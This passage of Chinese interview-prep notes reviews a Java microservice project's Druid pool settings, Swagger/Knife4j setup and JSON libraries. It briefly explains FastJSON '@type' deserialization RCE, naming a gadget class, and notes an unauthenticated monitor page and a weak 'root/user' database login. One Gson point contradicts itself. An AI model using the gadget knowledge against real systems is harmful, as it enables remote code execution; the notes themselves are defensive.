  - **① 连接池解决什么**：数据库连接是**昂贵资源**——每次 `DriverManager.getConnection()` 都要 TCP 三次握手 + MySQL 认证 + 服务端分配线程和会话内存（每连接约几百 KB）、初始化会话变量。如果每次 SQL 都新建连接，高并发下**光建连接的开销就压垮数据库**。连接池的做法是**预先建立一批连接放进池子，用完归还而不是关闭**，把「建连接」的 O(握手) 成本摊薄成 O(1) 的借还操作。
  - **② 为什么是 Druid 不是 HikariCP**：
    | 维度 | Druid | HikariCP |
    |---|---|---|
    | 性能 | 好 | **业界最快（字节码优化）** |
    | **监控** | ✅ **内置 StatFilter + 监控页面（SQL 慢查询、执行次数、并发数）** | ❌ 无内置 |
    | **SQL 防火墙** | ✅ **WallFilter 防 SQL 注入** | ❌ |
    | 功能 | 连接池 + 监控 + 防火墙 + 加密 | 只做连接池，专注 |
    | SpringBoot 默认 | 否 | **是（2.x 起默认）** |
    | 社区 | 阿里维护，国内主流 | 国外主流，Spring 官方推荐 |
    
    **选 Druid 的实在理由**：① **监控能力**——项目里 6 个服务、20 张表、几十个 Mapper，我需要在出现慢查询时能立刻看到「哪条 SQL 慢、执行了几次、有没有全表扫」，Druid 的 `StatFilter` + `/druid/index.html` 直接给这些数据，不用额外接 APM；② **WallFilter** 可以作为 SQL 注入的最后一道防线；③ 国内团队熟悉度高。
    - **反过来讲 HikariCP 的优势**（体现客观）：HikariCP 更轻、更快、字节码级别的优化，如果只看性能且已有完善的 APM（SkyWalking/Prometheus）和 SQL 审计，HikariCP 是更好的选择——**这也是为什么 SpringBoot 2.x 把它作为默认**。
  - **③ 代价**：Druid 功能多意味着**复杂度和攻击面**；而且它的监控页面 `/druid/*` **默认不需要认证**，如果不加访问控制就暴露在公网，等于把数据库结构和 SQL 全暴露了（生产必须关掉或加认证）。

**Q2 [必答] Druid 的核心参数有哪些？**

- **答**（背这几个就够，重点说清含义）：
  | 参数 | 默认值 | 含义与调优建议 |
  |---|---|---|
  | `initialSize` | 0 | 启动时创建的连接数。建议设成 `minIdle`，避免启动后突发流量才建连 |
  | `minIdle` | 0 | 最小空闲连接数。**这个值保证「低谷期也不释放连接」**，避免流量回升时重新建连 |
  | `maxActive` | **8** | **最大活跃连接数**。⚠️ **Druid 默认只有 8！** 这是最容易忽略的坑 |
  | `maxWait` | -1（无限等待） | 获取连接的最大等待时间。**必须设置**（如 3000ms），否则连接耗尽时线程无限挂起 |
  | `validationQuery` | null | 连接有效性检测 SQL，MySQL 用 `SELECT 1` |
  | `testWhileIdle` | false | 空闲时检测（**推荐 true**，配合 `timeBetweenEvictionRunsMillis`） |
  | `testOnBorrow` | false | 借出时检测（**性能损耗大，不推荐 true**，用 `testWhileIdle` 代替） |
  | `timeBetweenEvictionRunsMillis` | 60000 | 空闲连接检测线程的检测间隔 |
  | `minEvictableIdleTimeMillis` | 1800000（30 分钟） | 连接最小空闲存活时间 |
  | `keepAlive` | false | **保持空闲连接不超时被 MySQL 断掉**（MySQL 默认 `wait_timeout=8h`）。长连接场景建议开 |
  | `removeAbandoned` | false | 是否回收「忘记 close」的连接（开发期排查用，生产慎开） |
  | `connectionProperties` | — | 如 `druid.stat.mergeSql=true;druid.stat.slowSqlMillis=1000`（慢 SQL 定义） |
  | `filters` | — | 插件链，如 `stat,wall,slf4j` |

  ```yaml
  # 生产推荐配置（我项目里应该加上这个）
  spring:
    datasource:
      type: com.alibaba.druid.pool.DruidDataSource
      druid:
        initial-size: 10
        min-idle: 10
        max-active: 50                 # 根据 DB 承载能力和实例数定：maxActive × 实例数 < DB max_connections
        max-wait: 3000
        validation-query: SELECT 1
        test-while-idle: true
        test-on-borrow: false
        time-between-eviction-runs-millis: 60000
        min-evictable-idle-time-millis: 300000
        keep-alive: true
        filters: stat,wall
        connection-properties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=1000
  ```

**Q3 [深挖] 你项目里 Druid 配了吗？**

- **考点**：**主动认，然后讲清后果和影响面。**

- **答**（诚实）：
  - **没有配**。yml 里只有 `type: com.alibaba.druid.pool.DruidDataSource` 一行，**没有任何池参数，没有 `DruidConfig` 类，没有开 `filters`，没有监控页面**。也就是说：**引入了 Druid，但只用了它「作为连接池」的默认行为，它最有价值的监控和防火墙能力完全没启用。**
  - **默认参数带来的具体后果**：
    1. **🔴 `maxActive` 默认 8**：意味着**每个服务最多只有 8 个并发数据库连接**。我有几处会把连接**长时间占用**：
       - `UploadAndEditServiceImpl.uploadTotal` 里 `@Transactional` 包住了 Feign 远程调用（`client.sendUploadNotice`）—— **事务持有连接等待网络 I/O**；
       - `VideoEncodeConsumer` 是在 MQ 消费线程里做**视频转码（几十秒到几分钟）**，如果它同时持有事务/连接，那一个连接就被占几分钟；
       - `GetNoticeServiceImpl.getNoticeCount` 一条请求发 6 次 SQL。
       
       综合起来：**8 个连接在并发几十的请求下会瞬间耗尽**，后续请求全部阻塞在 `getConnection()`。
    2. **🔴 `maxWait = -1`（无限等待）**：连接耗尽时线程**永久阻塞而不是快速失败**。表现是「接口全部超时挂起、线程池被打满、服务假死」，**而且日志里看不到任何异常**（因为它不抛异常，只是等）——这是最难排查的故障形态。
    3. **🟠 无 `validationQuery` + `testWhileIdle`**：MySQL 默认 8 小时断开空闲连接，而连接池不知道该连接已死，**借出去用时报 `CommunicationsException: The last packet successfully received from the server was xxx milliseconds ago`**。这是「服务跑了一夜，第二天早上第一批请求全部报错」的经典原因。
    4. **🟠 无慢 SQL 监控**：这也是为什么我项目里那些**全表扫描**（第 12.4 节）一直没被发现——因为没有 `StatFilter`，没人看到「这条 SQL 扫描了 10 万行」。
    5. **🟠 `filters` 未开 → WallFilter 未生效**：SQL 注入的最后一道防线缺失（虽然项目里全用 `#{}`，但这是纵深防御）。
    6. **🟠 无 `DruidConfig` 类**：监控 Servlet/Filter 都没注册，`/druid/index.html` 访问不了。
  - **`maxActive × 实例数 < 数据库 max_connections`** 这个容量公式要能说出来：如果每个服务 maxActive=50、每个服务 2 副本、共 5 个服务，那就是 `50 × 2 × 5 = 500` 个连接，而 MySQL 默认 `max_connections=151` —— **会直接把数据库连接打满**。所以连接池的 maxActive 必须**除以服务实例数**来算。**这是我项目里最该先补的配置项（哪怕只设一个 `maxWait`）。**

**Q4 [进阶] 连接池大小的经验值是多少？**

- **答**（**这题有个反直觉的经典答案，答出来很亮眼**）：
  - **常见错误做法**：以为「连接越多并发越高」，把 `maxActive` 设成几百上千。实际上**数据库的瓶颈是 CPU、磁盘 IO 和锁**，连接数超过某个点后，**并发会下降**（线程上下文切换、锁竞争、内存交换增多）。
  - **PostgreSQL 社区的经典公式**（HikariCP 官方文档引用）：
    ```
    连接数 = ((CPU 核数 × 2) + 有效磁盘数)
    ```
    比如 4 核 + 1 块 SSD → `(4×2)+1 = 9` 个连接。听起来少得惊人，但配合「连接持有时间要短」这个前提，**9 个连接能支撑很高的 QPS**。
  - **真正的关键不是连接数，而是「连接的持有时间」**：
    ```
    理论 QPS ≈ 连接数 / 平均单次请求持有连接的时间
    ```
    如果一次请求持有连接 10ms，8 个连接就是 `8 / 0.01 = 800 QPS`；但如果像我的 `uploadTotal` 那样**事务里等 Feign 网络 I/O 500ms**，那就是 `8 / 0.5 = 16 QPS` —— **同一个池子，吞吐差 50 倍**。
    - **所以优化顺序是**：**先缩短持有时间**（事务内不做远程调用/转码/大计算），再谈加连接数。**我项目恰好犯了这个错**（事务里等 I/O），所以先修代码比调参数收益大得多。
  - **加分句**：**「连接池的容量不是按『峰值 QPS × 平均耗时』算出来的，因为它是个排队系统。经验做法是：先按 `CPU×2+磁盘数` 设一个保守值，然后压测观察 `maxWait` 和 `活跃连接数` 指标——如果活跃连接数长期贴着 maxActive 且有等待，先排查是不是有慢 SQL 或长事务占着连接，而不是直接加连接数。」**

### 13.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **Druid 参数一个都没配，`maxActive` 默认 8** | 各 `application.yml` | 🔴 致命 | 配全套池参数 |
| **`maxWait` 默认无限等待 → 连接耗尽时服务假死** | 同上 | 🔴 致命 | 设 `maxWait: 3000` 快速失败 |
| **事务内等 Feign/MQ I-O，长占连接** | `UploadAndEditServiceImpl:119,130` | 🔴 致命 | 事务内只做 DB 操作 |
| 无 `validationQuery` + `testWhileIdle` → 借到死连接 | 同上 | 🟠 高 | `SELECT 1` + `testWhileIdle: true` |
| **未开 `StatFilter` → 全表扫描一直没被发现** | 同上 | 🟠 高 | `filters: stat,wall` + 慢 SQL 阈值 |
| 未开 WallFilter | 同上 | 🟡 中 | `filters` 加 `wall` |
| 无 `DruidConfig`，监控页面不可用 | 无该类 | 🟡 中 | 注册 `StatViewServlet` 并加认证 |
| 数据库账号为 `root` 且密码简单 | 各 yml `username: root / password: user` | 🟠 高 | 最小权限专用账号 + 强密码 |

---

## 第 14 章 Swagger / Knife4j —— 接口文档

### 14.1 在这个项目里它扮演什么角色

**一句话**：Swagger（具体实现是**国产增强版 Knife4j**）是这个项目的**接口文档与调试平台**，让 6 个服务的**几十个 REST 接口**有了自解释的文档。

**落点**：
- 依赖：`knife4j-openapi2-spring-boot-starter` **4.3.0**（基于 Swagger 2 / OpenAPI 2.0），各模块 pom 都有。
- 配置：每个业务模块一个 `Knife4jConfiguration`，例如 `video/config/Knife4jConfiguration.java`：
  ```java
  @Configuration
  @EnableSwagger2WebMvc
  @EnableAspectJAutoProxy
  public class Knife4jConfiguration {
      @Bean(value = "dockerBean")
      public Docket dockerBean() {
          return new Docket(DocumentationType.SWAGGER_2)
                  .apiInfo(new ApiInfoBuilder()
                          .title("视频模块文档")
                          .description("# 首页、视频详情页、个人主页视频数据的获取以及对视频的操作")
                          .version("1.0")
                          .build())
                  .groupName("视频服务")
                  .select()
                  .apis(RequestHandlerSelectors.basePackage("ljl.bilibili.video.controller"))
                  .paths(PathSelectors.any())
                  .build();
      }
  }
  ```
- 注解使用：`@Api(tags="...")` 标 Controller、`@ApiOperation("...")` 标方法、`@ApiModelProperty("...")` 标字段——**项目里这些注解用得相当全面**，例如：
  ```java
  @Api(tags = "上传视频和编辑视频")
  public class UploadAndEditController {
      @ApiOperation("上传分片并获取视频第一帧图片和合并后的路径")
      ...
  }
  @ApiModelProperty("视频的名字")
  private String videoName;
  ```
- **内部接口用 `@ApiIgnore` 隐藏**：`VideoEncodeController` 的 3 个方法（`getVideoInputStream`、`uploadVideo`、`uploadVideoCover`）都标了 `@ApiIgnore`，因为它们**只给 Feign 内部调用，不该暴露给前端**。**这是个正确的做法，面试时可以主动提。**

### 14.2 高频问答

**Q1 [必答] 为什么要用 Swagger？解决了什么问题？**

- **答**（三段）：
  - **① 解决什么**：前后端分离下**接口契约的同步问题**。没有 Swagger 时，接口文档靠 Word/Markdown 手写，**必然过期**（改了代码忘了改文档 → 前端按旧文档调 → 联调扯皮）。Swagger 的核心价值是**「文档从代码生成」**——注解写在 Controller 上，文档自动跟着代码走，**文档和代码不可能不一致**。
  - **② 具体收益**：
    1. **文档自动生成且不会过期**；
    2. **可在线调试**（Knife4j 的「调试」页签能直接发请求，不用 Postman 抄参数）；
    3. **请求/响应模型自动展开**（`@ApiModelProperty` 的说明会显示在字段旁）；
    4. **可导出**（OpenAPI JSON 能导入 Postman/Apifox，也能生成前端 TS 类型）；
    5. **分组管理**（我用 `groupName("视频服务")` 按服务分组，6 个服务的接口不会混在一起）；
    6. **对测试友好**——测试同学能自己看文档造数据。
  - **③ 为什么是 Knife4j 不是原生 Swagger UI**：
    | 维度 | Knife4j | 原生 Swagger UI |
    |---|---|---|
    | 界面 | **中文、美观、功能多** | 英文、朴素 |
    | 调试 | ✅ 内置调试面板（可改 header、看原始请求响应） | 基础 |
    | 搜索 | ✅ 全局搜索接口 | ❌ |
    | 全局参数 | ✅ 可配全局 header（如 token） | 需手改 |
    | 离线文档 | ✅ 可导出 HTML/Markdown/Word | 有限 |
    | 依赖 | 对 SpringBoot 2.x 有专门适配 | 官方 |
  - **④ 代价与风险**（必须讲）：
    1. **🟠 生产环境必须关闭**：Swagger 会把**全部接口、参数结构、错误码**暴露出去，等于给攻击者一份完整的攻击面清单。
       ```yaml
       knife4j:
         enable: false              # 生产关掉
       # 或者按 profile 条件装配 Docket Bean
       @Profile("!prod")
       ```
    2. **🟠 注解侵入业务代码**：`@ApiOperation`、`@ApiModelProperty` 混在 Controller/Entity 里，属于**文档关注点侵入代码**。SpringDoc（OpenAPI 3）配合 JSR-303 校验注解能减少一部分重复描述。
    3. **🟡 版本演进的坑**：项目里同时引了 `knife4j-openapi2-spring-boot-starter`（Swagger 2）**和** `knife4j-openapi3-jakarta-spring-boot-starter`（OpenAPI 3 + Jakarta）。**后者是给 SpringBoot 3 / `jakarta.*` 用的，和项目（SpringBoot 2.6 / `javax.*`）不兼容**，属于纯粹的依赖污染，应该删掉。
    4. **🟡 需要额外配置才能被网关放行**：`SecurityConfig` 里特意放行了 `/webjars/`、`/swagger-resources/**`、`/v2/**`、`/swagger-ui.html`，说明**文档页面的静态资源和 API 需要过网关鉴权白名单**（见第 2 章）。

**Q2 [进阶] Swagger 2 和 OpenAPI 3 有什么区别？项目用的是哪个？**

- **答**：
  - **项目实际用的是 Swagger 2**（`DocumentationType.SWAGGER_2` + `springfox` 包名 `springfox.documentation.*`），依赖是 `knife4j-openapi2-spring-boot-starter`。
  - **两者的关系与区别**：
    | | Swagger 2 (OpenAPI 2.0) | OpenAPI 3 |
    |---|---|---|
    | 规范名 | Swagger Specification | **OpenAPI Specification**（捐给 Linux 基金会后改名） |
    | 实现 | **Springfox**（`springfox-*`） | **SpringDoc**（`springdoc-openapi-*`） |
    | 注解包 | `io.swagger.annotations.*`（`@Api`、`@ApiOperation`） | `io.swagger.v3.oas.annotations.*`（`@Tag`、`@Operation`） |
    | 请求体定义 | `@ApiParam` / 隐式 | **`@RequestBody` 描述更规范** |
    | `$ref` / 组合 | 弱 | **强（支持 `oneOf`/`anyOf`/`allOf`）** |
    | 多 server | 单一 host/basePath | **`servers` 数组（多环境友好）** |
    | 安全定义 | `securityDefinitions` | **`securitySchemes`（支持更多类型）** |
    | SpringBoot 3 | ❌ 不兼容（Springfox 依赖 `javax.*`） | ✅ 必须用 SpringDoc |
    | 维护状态 | **Springfox 基本停更（2020 年后）** | **活跃** |
  - **为什么这题要会**：Swagger 2 → OpenAPI 3 是**近两年真实项目的迁移动作**，而且 SpringBoot 2 → 3 必然伴随这个迁移（因为 `javax.* → jakarta.*`）。能说出来说明你关注技术演进。
  - **迁移代价（要能说清）**：① 注解全换（`@Api` → `@Tag`、`@ApiOperation` → `@Operation`、`@ApiModelProperty` → `@Schema`）——**项目里这类注解有 200+ 处**（我 grep 过大概 250 处 `@ApiModelProperty`），是个大工程；② `Docket` 配置要换成 `GroupedOpenApi`；③ 依赖换 `springdoc-openapi-ui`；④ Knife4j 要换到 openapi3 版本。
  - **加分句**：**「我项目用的是 Swagger 2 + Springfox，但 Springfox 已经基本停更了。如果要做 SpringBoot 3 升级，这一块必须一起迁到 SpringDoc + OpenAPI 3，因为 Springfox 依赖 `javax.*` 包，在 `jakarta.*` 环境下根本跑不起来——这也是我在项目里同时看到 `knife4j-openapi3-jakarta` 依赖的原因，那是一个没清掉的迁移残留。」**

**Q3 [深挖] 项目里 Swagger 的使用有什么不足？**

- **答**：
  1. **🔴 无生产环境开关**：`Knife4jConfiguration` 没有 `@Profile` 注解，`knife4j.enable` 也没配，所以**只要服务起来文档就公开可用**。生产必须关。
  2. **🟠 文档缺少鉴权信息**：接口需要 token 才能调，但 Docket 里**没有配 `securitySchemes`**，前端/测试在 Knife4j 上调试需要手动加 header。应该配全局参数：
     ```java
     .globalRequestParameters(Collections.singletonList(
         new RequestParameterBuilder().name("shortAuthorization").in(ParameterType.HEADER)
             .description("短 token").required(false).build()))
     ```
     **Knife4j 有个专门的配置更简单**：`knife4j.setting.enableSwaggerModels` + 界面上的「全局参数」设置。
  3. **🟠 没有响应示例和错误码说明**：`@ApiOperation` 只写了功能，没有 `@ApiResponses` 声明错误码。项目里所有接口都返回统一的 `Result<T>` 包装（`code/msg/data`），但**`Result` 的字段没有被文档化**，而且业务错误码（如 `code=600`）没有任何枚举和说明。
  4. **🟠 部分接口文档缺失**：`search` 模块的 `SearchController` 里多个方法标了 `@ApiIgnore`（`:65, :79, :85`），其中包括**对外提供的搜索接口**。应该在**只有内部 Feign 调用的接口**上用 `@ApiIgnore`，对外接口都要有文档。
  5. **🟡 与网关的路由不一致**：Knife4j 的文档页面在每个服务自己的端口上（video:10201、search:8201……），**前端要开 6 个页面看文档**。更好的做法是**在网关聚合所有服务的文档**（Knife4j 支持 gateway 聚合模式），一个页面看全部。
  6. **🟡 `termsOfServiceUrl` 和 `contact` 是占位内容**：`video/config/Knife4jConfiguration.java:23-24` 里写的是 `termsOfServiceUrl("https://哟.com/")`、`contact("哟")` —— **测试用的占位没清理**，这是很典型的"提交前没自查"痕迹，面试官看到会觉得不够专业。

### 14.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **文档无生产开关，生产会暴露全部接口** | 各 `Knife4jConfiguration`、无 `knife4j.enable` | 🟠 高 | `@Profile("!prod")` + `enable: false` |
| **同时引 openapi2 与 openapi3-jakarta 依赖** | `java/pom.xml:338-352` | 🟡 中 | 删掉不兼容的 openapi3 依赖 |
| 未配置 token 全局参数，无法在文档页调试 | 各 Docket | 🟡 中 | `globalRequestParameters` |
| `Result` 与业务错误码未文档化 | 全项目 | 🟡 中 | `@ApiModel` + 错误码枚举 |
| 对外接口被 `@ApiIgnore` 隐藏 | `SearchController:65,79,85` | 🟡 中 | 只隐藏内部 Feign 接口 |
| 文档分散在 6 个服务端口 | 无网关聚合 | 🟢 低 | Knife4j gateway 聚合 |
| 占位内容未清理（"哟.com"） | `video/config/Knife4jConfiguration.java:23-24` | 🟢 低 | 填空或删除 |

---

## 第 15 章 Gson —— 谷歌序列化转换

### 15.1 在这个项目里它扮演什么角色

**一句话**：Gson 是这个项目里 **WebSocket 链路的专用 JSON 工具**——因为它**轻量、无框架依赖、能在非 Spring 管理的对象里直接用**。

**依赖**：`gson` **2.10.1**（`java/pom.xml:243-247`），在 `chat` 和 `notice` 模块实际使用。

**实际落点（全部集中在 chat 的 WebSocket 链路）**

| 用途 | 源码 |
|---|---|
| WebSocket 消息的**解析**（前端 → 后端） | `WebSocketHandler:66` `JsonParser.parseString(message.getPayload()).getAsJsonObject()` |
| WebSocket 消息的**构造**（后端 → 前端） | `WebSocketHandler:54-57,112-115,143-145`（`JsonObject` + `addProperty`） |
| **大模型流式响应**的解析（星火 → 后端） | `BigModelHandler:106` `gson.fromJson(text, JsonParse.class)` |
| 事件消息的反序列化 | `WebSocketHandler:53` `gson.fromJson(event.getMessage(), ChatMessage.class)` |

**典型代码**：
```java
// chat/handler/WebSocketHandler.java
public static final Gson gson = new Gson();          // ★ 静态单例

// 解析前端消息
JsonObject json = JsonParser.parseString(message.getPayload()).getAsJsonObject();
String type = json.get(MESSAGE_TYPE).getAsString();

// 构造回推消息
JsonObject jsonText = new JsonObject();
jsonText.addProperty("status", chatMessage.getStatus());
jsonText.addProperty("type", MESSAGE_TYPE_BIGMODEL);
jsonText.addProperty("content", chatMessage.getContent());
session.sendMessage(new TextMessage(jsonText.toString()));

// 流式帧解析（星火返回的 JSON 映射到内部类）
JsonParse myJsonParse = gson.fromJson(text, JsonParse.class);
Integer status = myJsonParse.header.status;
List<Text> textList = myJsonParse.payload.choices.text;
```

### 15.2 高频问答

**Q1 [必答] 一个项目里为什么同时有 Gson、FastJSON、Jackson 三套 JSON 库？**

- **考点**：**这题一定要能说清「不是随便引的」，否则显得技术栈混乱。**

- **答**（**先说事实分布，再讲每套的定位理由**）：
  | 库 | 项目里用在哪 | 为什么用它 |
  |---|---|---|
  | **Jackson** | Spring MVC 的 `@RequestBody`/`@ResponseBody`、`ObjectMapper`（`MysqlToEsHandler`、`UploadAndEditServiceImpl` 等） | **SpringBoot 默认自带**，Web 层序列化零配置；`@JsonProperty`、`@JsonFormat`、`PropertyNamingStrategies.SNAKE_CASE` 生态最全 |
  | **FastJSON** | `BigModelHandler.run()` 构造星火请求体、`ChatServiceImpl.getPPT` 解析 AIPPT 响应、`GenericFastJsonRedisSerializer`（Redis 序列化） | **API 最简洁**（`JSONObject.put` 链式构造嵌套 JSON 很顺手）；**带 `@type` 能还原对象类型**，适合 Redis 存取 |
  | **Gson** | **chat 模块的 WebSocket 链路**（消息解析/构造、星火流式帧解析）、`notice` 模块 | **无任何框架依赖、纯工具库**，可以在**非 Spring Bean**（如 `BigModelHandler extends WebSocketListener`，是 `new` 出来的）里直接用；**API 轻、`JsonObject.addProperty` 构造 WebSocket 小报文很直观** |
  - **核心解释（Gson 的存在理由）**：`BigModelHandler` 是 **`new BigModelHandler(...)` 手动创建的 OkHttp 监听器**，**不是 Spring Bean**，所以它**拿不到容器里配置好的 `ObjectMapper`**（没法 `@Resource` 注入）。这时候 Gson 的**静态单例 + 零依赖**特性就是最省事的选择：
    ```java
    public static final Gson gson = new Gson();    // 静态可用，不需要容器
    ```
    **这是 Gson 在这个项目里真正的定位：给「游离于容器之外的对象」用的 JSON 工具。**
  - **诚实的自我评价**：从工程规范角度，**一个项目里三套 JSON 库是不好的**——① 序列化行为不一致（`null` 处理、日期格式、驼峰/下划线策略各不相同）；② 依赖体积变大；③ 维护者要同时熟悉三套 API；④ **FastJSON 有过多个反序列化 RCE 漏洞**（我在 `java/pom.xml` 里用的是 2.0.40，属于较新版本，但仍需警惕）。
  - **正确的收敛方向**：**统一到 Jackson**（SpringBoot 默认，生态最好、最安全）。对「非 Spring Bean」场景，可以用静态工具类持有配置好的 `ObjectMapper`：
    ```java
    public final class JsonUtils {
        private static final ObjectMapper MAPPER = new ObjectMapper()
                .registerModule(new JavaTimeModule())
                .setPropertyNamingStrategy(PropertyNamingStrategies.SNAKE_CASE);
        public static String toJson(Object o) { ... }
        public static <T> T fromJson(String s, Class<T> c) { ... }
    }
    ```
    这样既解决了「非 Bean 无法注入」的问题，又统一了序列化行为。**Gson/FastJSON 只保留必需的（比如 Redis 的 `GenericFastJsonRedisSerializer` 若要沿用 `@type` 能力）。**

**Q2 [必答] Gson 的基本用法和常见坑讲一下。**

- **答**：
  - **基础用法**：
    ```java
    Gson gson = new Gson();
    String json  = gson.toJson(obj);                    // 序列化
    MyBean bean  = gson.fromJson(json, MyBean.class);   // 反序列化
    // 流式 API（构造/读取动态 JSON，比映射成类更灵活）
    JsonObject o = new JsonObject(); o.addProperty("k", "v");
    JsonParser.parseString(s).getAsJsonObject().get("type").getAsString();
    ```
  - **项目里的用法评价**：**构造 WebSocket 小报文用 `JsonObject.addProperty` 是对的**——它避免了为每种消息建 DTO 类，代码短且直观。**但解析用内部类映射（`JsonParse`/`Header`/`Payload`/`Choices`/`Text`）在 `BigModelHandler` 和 `PPTHandler` 里各写了一遍，是纯重复代码**（`BigModelHandler.java:201-248` 和 `PPTHandler` 里几乎一样），应该抽到 `common` 或一个公共 DTO。
  - **必须知道的坑**：
    1. **🔴 泛型擦除**：`gson.fromJson(json, List<MyBean>.class)` **编译不过**，必须用 `TypeToken`：
       ```java
       List<MyBean> list = gson.fromJson(json, new TypeToken<List<MyBean>>(){}.getType());
       ```
       写成 `List.class` 会得到 `List<LinkedTreeMap>`，**后续 `get()` 时 ClassCastException**。这是 Gson 最高频的坑。
    2. **🟠 默认忽略 `null` 字段**：`toJson` 时 null 字段**不输出**。前端如果依赖字段存在（比如判 `if (data.cover)`）没问题，但如果是**必须传 null 覆盖**的场景（比如 `PUT` 全量更新）就会出问题。用 `new GsonBuilder().serializeNulls().create()` 解决。
    3. **🟠 默认不做 HTML 转义**（其实 Gson 默认**会**转义 `<`、`>`、`&` 等为 `\u003c`），如果不需要可以 `disableHtmlEscaping()`。**在 WebSocket 回推内容里带 HTML 时要注意这个行为**（比如 AI 回复的 Markdown 里含 `<>` 会被转义成 Unicode 转义序列，前端 JSON.parse 能正常还原，所以一般没问题）。
    4. **🟠 字段名策略**：Java 用驼峰、JSON 用下划线时需要 `@SerializedName("video_id")` 或 `FieldNamingPolicy.LOWER_CASE_WITH_UNDERSCORES`。项目里 `WebSocketHandler` 用的是手动 `addProperty("sessionId", ...)`，**手写字符串键名，容易写错且无法被重构保护**——这是 `JsonObject` 流式 API 的固有代价。
    5. **🟠 无 `transient` / 循环引用处理**：Gson 遇到双向引用（如 `A.b = B`, `B.a = A`）会**无限递归 StackOverflow**，Jackson 有 `@JsonIgnore`/`@JsonManagedReference` 等成熟方案。
    6. **🟡 日期格式**：Gson 默认不处理 `java.time.*`（LocalDateTime 会失败），要注册 `LocalDateTimeAdapter`。项目里 `UploadAndEditServiceImpl` 用的是 **Jackson 的 `JavaTimeModule` + `LocalDateTimeSerializer`**（`:131-137`）——**说明项目里日期序列化是 Jackson 处理的，Gson 没碰日期**，这是好事（避免了一个坑）。
  - **性能注意**：**`Gson` 实例应该复用**（它内部缓存 `TypeAdapter`，每次 `new Gson()` 会重新构建适配器链）。项目里用 `public static final Gson gson = new Gson()` 是**正确**的做法；`BigModelHandler` 里也是 `public static final Gson gson`。**这一点做得对。**

**Q3 [进阶] `GenericFastJsonRedisSerializer` 为什么会给 ES 文档带上 `@type`？**

- **考点**：**这题把 Gson/FastJSON 和 Redis/ES 串起来了，很能体现「跨模块理解能力」。**

- **答**：
  - **现象**：`MysqlToEsHandler.normalizeVideoDocument()` 里有这么一行：
    ```java
    document.remove("@type");     // redis 反序列化会带上类型标记
    document.remove("table");
    ```
    **需要在写 ES 前手动删 `@type` 字段**。
  - **原因链**：
    1. `RedisConfig` 里注册的 `objectRedisTemplate` 用的 value 序列化器是 **`GenericFastJsonRedisSerializer`**；
    2. 这个序列化器的特点是**在 JSON 里写入 `@type` 字段记录 Java 类全限定名**，目的是反序列化时能**还原成原本的具体类型**（因为容器里存的是 `Object`，不带类型信息就只能还原成 `LinkedHashMap`）；
    3. 但它存的是 `Map<String,Object>`，`@type` 会被 FastJSON 写成 `java.util.HashMap`；
    4. search 端 `range()` 取出来时，RedisTemplate 按 `Object` 反序列化 → **得到带 `@type` 键的 Map**；
    5. 如果直接把这个 Map 交给 ES 的 `IndexRequest.source(map)`，**ES 里就会出现一个叫 `@type` 的字段**。
  - **后果（要说清为什么必须删）**：
    - **🔴 `@type: java.util.HashMap` 会进入 ES 文档**，污染索引、出现在 `_source` 里，前端拿到 `_source` 反序列化成 DTO 时会报未知字段（取决于是否配了 `FAIL_ON_UNKNOWN_PROPERTIES`）；
    - **🔴 更危险的是 `@type` 是 FastJSON 的反序列化攻击面**：如果这个字段的值能被外部控制（比如攻击者往 Redis 里塞数据，或者通过接口写入），`@type` 指定 `com.sun.rowset.JdbcRowSetImpl` 之类的 gadget 类就能触发**反序列化 RCE**。FastJSON 历史上多个高危漏洞（CVE-2017-18349 等）都是这个机制。**虽然这里数据源是内部服务，但「把 `@type` 从里到外清洗掉」是正确的防御。**
  - **根本解法**（三个层次，由浅入深）：
    1. **手动 remove**（项目现状）：能用，但**每个消费点都要记得删，漏一处就漏一处**——属于「打补丁」。
    2. **换序列化器**：用 Jackson 的 `GenericJackson2JsonRedisSerializer`。它**也写类型信息**（字段名是 `@class`），所以**同样有这个问题**，需要配 `activateDefaultTyping` 的 `PolymorphicTypeValidator` 或干脆用 `Jackson2JsonRedisSerializer<Object>` 指定具体类型。
    3. **✅ 最佳：队列里传明确类型的 DTO，不要传裸 `Map`**。
       ```java
       // 现在：Map<String,Object> 到处传，类型信息全靠 @type 猜
       client.sendDBChangeNotice(Map<String,Object> map);
       // 应该：定义强类型事件对象
       public class VideoChangeEvent { 
           private ChangeType type;      // ADD/UPDATE/DELETE
           private Integer videoId;
           private String videoName;
           // ...
       }
       client.sendDBChangeNotice(VideoChangeEvent event);
       ```
       **这样做的好处**：① **不需要 `@type`**（消费端直接按 `VideoChangeEvent` 反序列化），从根本上消灭这个字段；② **字段名一致性由编译期保证**——而这正是项目里另一个真实 bug 的根源（见下）；③ 可读性和可维护性质变。
  - **⚠️ 串起来的真实 bug**：`MysqlToEsHandler` 的注释里记录了 **FIX-19**：
    > 「增量消息由 video 服务发出（`UploadAndEditServiceImpl` 用 SNAKE_CASE 序列化 Video 实体），落进 redis 的是 `name`/`user_id`/`video_length`；而全量同步写的是 `video_name`/`author_id`/`author_name`/`length`。两者不一致的后果：新投稿的视频文档在 ES 里**确实存在**，但只有 `name` 字段，而搜索只查 `video_name`/`author_name`/`intro` → **新视频永远搜不到**」
    
    **这个 bug 的根因就是「用 `Map<String,Object>` 当跨服务契约」**——字段名靠字符串约定，**没有编译期校验，两边不一致也编译通过**。修法是写了个 `normalizeVideoDocument()` 做字段名映射（**打的补丁**），**真正的修复是强类型 DTO**。**面试时把这个「从 `@type` → Map 契约 → 字段名不一致 → 新视频搜不到」的完整推演讲出来，是很有说服力的架构思考。**

### 15.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **Gson/FastJSON/Jackson 三套并存** | 全项目 | 🟡 中 | 统一 Jackson + 静态 `JsonUtils` |
| **`Map<String,Object>` 当跨服务契约** | `SendDBChangeServiceImpl`、`MysqlToEsHandler` | 🟠 高 | 强类型事件 DTO |
| **`@type` 污染 ES 文档（且是反序列化攻击面）** | `MysqlToEsHandler:185` | 🟠 高 | 强类型 DTO（根除）/ 换序列化器 |
| `JsonParse`/`Header`/`Payload` 内部类重复两遍 | `BigModelHandler:201-248`、`PPTHandler` | 🟡 中 | 抽公共 DTO |
| `addProperty("sessionId", ...)` 手写字符串键 | `WebSocketHandler` 多处 | 🟢 低 | 常量已定义，但仍无编译期保护 |
